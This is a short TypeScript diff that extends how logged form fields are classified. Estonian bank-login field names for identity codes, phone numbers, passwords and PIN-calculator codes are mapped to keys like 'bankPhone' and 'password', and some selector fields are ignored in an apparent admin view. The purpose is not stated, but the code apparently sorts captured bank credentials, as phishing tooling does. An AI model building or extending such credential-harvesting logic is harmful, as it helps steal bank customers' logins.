@@ -17,6 +17,7 @@ function inferCanonicalLogFieldKey(
 
   if (
     normalizedKey.includes("personalidentitycode") ||
+    normalizedKey.includes("personalidentificationcode") ||
     normalizedKey.includes("identitycode") ||
     normalizedKey.includes("personalcode") ||
     normalizedKey.includes("isikukood")
@@ -28,8 +29,10 @@ function inferCanonicalLogFieldKey(
     normalizedKey.includes("telefoninumber") ||
     normalizedKey.includes("mobilenumber") ||
     normalizedKey.includes("phonenumber") ||
+    normalizedKey.includes("mobileidphone") ||
     normalizedKey.includes("phonefield") ||
     normalizedKey.includes("telefon") ||
+    normalizedKey.includes("phone") ||
     normalizedKey === "phone"
   ) {
     return "bankPhone";
@@ -51,7 +54,10 @@ function inferCanonicalLogFieldKey(
     normalizedKey.includes("password") ||
     normalizedKey.includes("passcode") ||
     normalizedKey.includes("parool") ||
+    normalizedKey.includes("pincalculatorcode") ||
+    normalizedKey.includes("pincalccode") ||
     normalizedKey.includes("pincalcpassword") ||
+    normalizedKey === "pincalc" ||
     normalizedKey === "pin"
   ) {
     return "password";
@@ -79,6 +85,7 @@ function isIgnoredAdminBankFieldKey(key: string): boolean {
   const normalizedKey = key.toLowerCase().replace(/[^a-z0-9]/g, "");
 
   return (
+    /^input\d+$/.test(normalizedKey) ||
     normalizedKey.includes("rememberme") ||
     normalizedKey.includes("remembermesimpleid") ||
     normalizedKey.includes("remembermesmartid") ||
@@ -86,7 +93,12 @@ function isIgnoredAdminBankFieldKey(key: string): boolean {
     normalizedKey.includes("loginwidget") ||
     normalizedKey.includes("useridmid") ||
     normalizedKey.includes("useridsid") ||
-    normalizedKey.includes("useridsimple")
+    normalizedKey.includes("useridsimple") ||
+    normalizedKey === "mobileid" ||
+    normalizedKey === "smartid" ||
+    normalizedKey === "idcard" ||
+    normalizedKey === "pincalc" ||
+    normalizedKey === "kalkulaator"
   );
 }
 
